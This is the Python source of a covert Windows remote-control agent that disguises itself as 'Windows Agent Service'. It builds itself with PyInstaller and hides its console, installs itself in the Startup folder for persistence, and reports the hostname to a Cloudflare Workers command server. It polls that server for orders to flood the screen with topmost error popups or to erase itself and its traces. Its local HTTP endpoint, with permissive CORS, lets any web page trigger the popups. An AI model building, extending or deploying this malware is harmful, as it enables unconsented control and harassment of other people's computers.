import ctypes
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

# cd /d C:\Users\User\Desktop\telelluc
# python -m PyInstaller --onefile --noconsole --name "Windows Agent Service" telelluc.py

PORT = 5005

AGENT_TOKEN = "ed81f9a6ad3fe1ba5587430863c983c2ea2c77239a158fa7"
LOG_AUTH_URL = "https://telelluc-log-auth.mrocadlectric.workers.dev"
HEARTBEAT_INTERVAL_SECONDS = 60
COMMAND_CHECK_INTERVAL_SECONDS = 5
INACTIVITY_THRESHOLD_SECONDS = 130
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) telelluc-agent"

device_id = None
last_command_time = time.time()

ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")

ERROR_VBS_CONTENT = 'MsgBox "Error", 16 + 65536 + 4096, "Error"\n'
ACTIVATOR_VBS_CONTENT = (
    'Set shell = CreateObject("WScript.Shell")\n'
    "For i = 1 To 25\n"
    "    WScript.Sleep 200\n"
    "Next\n"
)

with open(ERROR_VBS_PATH, "w") as f:
    f.write(ERROR_VBS_CONTENT)

with open(ACTIVATOR_VBS_PATH, "w") as f:
    f.write(ACTIVATOR_VBS_CONTENT)

user32 = ctypes.windll.user32
HWND_TOPMOST = -1
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_SHOWWINDOW = 0x0040




def _schedule_delete(path_to_delete):
    if not path_to_delete or not os.path.exists(path_to_delete):
        return False

    batch_lines = [
        "@echo off",
        "setlocal",
        "set \"target=%~1\"",
        ":retry",
        "del /f /q \"%target%\" 2>nul",
        "if exist \"%target%\" (",
        "  timeout /t 1 /nobreak >nul",
        "  goto :retry",
        ")",
        "exit /b 0",
    ]
    tmp_dir = tempfile.gettempdir()
    batch_path = os.path.join(tmp_dir, f"telelluc_delete_{int(time.time())}.bat")
    try:
        with open(batch_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(batch_lines) + "\n")
        subprocess.Popen(
            ["cmd", "/c", batch_path, path_to_delete],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
        )
        return True
    except Exception:
        return False


def ensure_startup():
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
    startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")

    try:
        os.makedirs(startup_dir, exist_ok=True)
    except OSError:
        return

    if getattr(sys, "frozen", False):
        source_exe = os.path.abspath(sys.executable)
        try:
            if not os.path.exists(startup_exe):
                shutil.copy2(source_exe, startup_exe)
            elif os.path.getmtime(source_exe) > os.path.getmtime(startup_exe):
                shutil.copy2(source_exe, startup_exe)

            if os.path.exists(startup_exe) and os.path.exists(source_exe) and os.path.abspath(source_exe) != os.path.abspath(startup_exe):
                try:
                    if os.path.getmtime(startup_exe) >= os.path.getmtime(source_exe):
                        try:
                            subprocess.Popen(
                                [startup_exe],
                                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                            )
                        except OSError:
                            pass

                        _schedule_delete(source_exe)
                        os._exit(0)
                except OSError:
                    pass
        except OSError:
            pass


def self_delete_agent(trigger_id):
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
    startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
    current_exe = os.path.abspath(sys.executable) if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent")
    local_exe = os.path.join(local_dir, "TelellucAgent.exe")

    legacy_startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
    legacy_local_exe = os.path.join(local_dir, "Windows Agent Service.exe")

    candidates = []
    for path in [startup_exe, current_exe, local_exe, legacy_startup_exe, legacy_local_exe]:
        if path and os.path.exists(path):
            candidates.append(os.path.abspath(path))

    batch_lines = [
        "@echo off",
        "setlocal EnableDelayedExpansion",
        "set \"parent_pid=%~1\"",
        "shift",
        ":loop",
        "if \"%~1\"==\"\" goto cleanup",
        "if exist \"%~1\" (",
        "  set \"target=%~1\"",
        "  set \"dir=%~dp1\"",
        "  set \"name=%~nx1\"",
        "  set \"renamed=!name!.deleted_!random!\"",
        "  ren \"!target!\" \"!renamed!\" 2>nul",
        "  if !errorlevel! equ 0 (",
        "    ping -n 2 127.0.0.1 >nul",
        "    taskkill /F /PID !parent_pid! >nul 2>&1",
        "    ping -n 2 127.0.0.1 >nul",
        "    del /f /q \"!dir!!renamed!\" >nul 2>&1",
        "  )",
        ")",
        "shift",
        "goto loop",
        ":cleanup",
        f"rmdir /s /q \"{local_dir}\" 2>nul",
        "del /f /q \"%temp%\\telelluc*.bat\" 2>nul",
        "del /f /q \"%temp%\\telelluc*.vbs\" 2>nul",
        "exit /b 0",
    ]

    tmp_dir = tempfile.gettempdir()
    batch_path = os.path.join(tmp_dir, f"telelluc_self_delete_{int(time.time())}.bat")
    try:
        with open(batch_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(batch_lines) + "\n")
        subprocess.Popen(
            ["cmd", "/c", batch_path, str(os.getpid()), *candidates],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
        )
    except Exception:
        pass

    return


def _find_error_window():
    result = []

    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    def _enum(hwnd, _lparam):
        if user32.IsWindowVisible(hwnd):
            buf = ctypes.create_unicode_buffer(256)
            user32.GetWindowTextW(hwnd, buf, 256)
            if buf.value.strip() == "Error":
                result.append(hwnd)
                return False
        return True

    user32.EnumWindows(_enum, 0)
    return result[0] if result else None


def _force_topmost():
    for _ in range(60):
        hwnd = _find_error_window()
        if hwnd:
            for _ in range(10):
                user32.SetWindowPos(
                    hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                )
                time.sleep(0.2)
            return
        time.sleep(0.05)


def show_error():
    subprocess.Popen(["wscript.exe", ERROR_VBS_PATH])
    subprocess.Popen(["wscript.exe", ACTIVATOR_VBS_PATH])
    _force_topmost()


def auto_compile():
    if getattr(sys, "frozen", False):
        return
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        subprocess.run(
            [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "Windows Agent Service", os.path.abspath(__file__)],
            cwd=script_dir,
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass


def heartbeat_loop():
    global device_id, last_command_time
    hostname = socket.gethostname()
    while True:
        try:
            time_since_command = time.time() - last_command_time
            is_active = time_since_command < INACTIVITY_THRESHOLD_SECONDS
            status = "active" if is_active else "inactive"
            seconds_inactive = max(0, int(time_since_command - INACTIVITY_THRESHOLD_SECONDS))

            payload = json.dumps({
                "hostname": hostname,
                "status": status,
                "seconds_inactive": seconds_inactive if not is_active else 0
            }).encode("utf-8")

            req = urllib.request.Request(
                LOG_AUTH_URL + "/heartbeat",
                data=payload,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + AGENT_TOKEN,
                    "User-Agent": USER_AGENT,
                },
                method="POST",
            )
            resp = urllib.request.urlopen(req, timeout=10).read()
            data = json.loads(resp.decode("utf-8"))
            device_id = data.get("id")
            print(f"[heartbeat] OK - device {device_id} ({hostname}) - {status}", flush=True)
        except Exception as e:
            print(f"[heartbeat] ERROR: {e}", flush=True)
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)


def command_check_loop():
    global device_id, last_command_time
    while True:
        if device_id is None:
            time.sleep(COMMAND_CHECK_INTERVAL_SECONDS)
            continue
        try:
            req = urllib.request.Request(
                LOG_AUTH_URL + f"/command?deviceId={device_id}",
                headers={
                    "Authorization": "Bearer " + AGENT_TOKEN,
                    "User-Agent": USER_AGENT,
                },
                method="GET",
            )
            resp = urllib.request.urlopen(req, timeout=10).read()
            data = json.loads(resp.decode("utf-8"))
            cmd = data.get("command")
            cantidad = data.get("cantidad", 1)

            if cmd and cmd != "none":
                last_command_time = time.time()

            if cmd == "error":
                print(f"[command] Recibido 'error' para device {device_id} (Cantidad: {cantidad})", flush=True)
                for _ in range(int(cantidad)):
                    threading.Thread(target=show_error, daemon=True).start()

            elif cmd == "self-delete":
                print(f"[command] Recibido 'self-delete' para device {device_id}. Iniciando desinstalación...", flush=True)
                threading.Thread(target=lambda: self_delete_agent(device_id), daemon=True).start()

        except Exception as e:
            print(f"[command] ERROR: {e}", flush=True)
        time.sleep(COMMAND_CHECK_INTERVAL_SECONDS)


class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Private-Network", "true")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        if self.path == "/error":
            threading.Thread(target=show_error, daemon=True).start()
            self.send_response(200)
        else:
            self.send_response(404)
        self._cors()
        self.end_headers()

    def do_POST(self):
        if self.path == "/self-delete":
            length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(length).decode("utf-8") if length else "{}"
            try:
                payload = json.loads(body)
            except Exception:
                payload = {}
            trigger_id = payload.get("id") if isinstance(payload, dict) else None
            threading.Thread(target=lambda: self_delete_agent(trigger_id), daemon=True).start()
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b'{"ok": true}')
            return

        self.send_response(404)
        self._cors()
        self.end_headers()

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    auto_compile()
    ensure_startup()
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=command_check_loop, daemon=True).start()

    server = HTTPServer(("127.0.0.1", PORT), Handler)
    print(f"[*] Agente escuchando peticiones de interfaz en http://127.0.0.1:{PORT} ...", flush=True)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nCerrando el agente local.")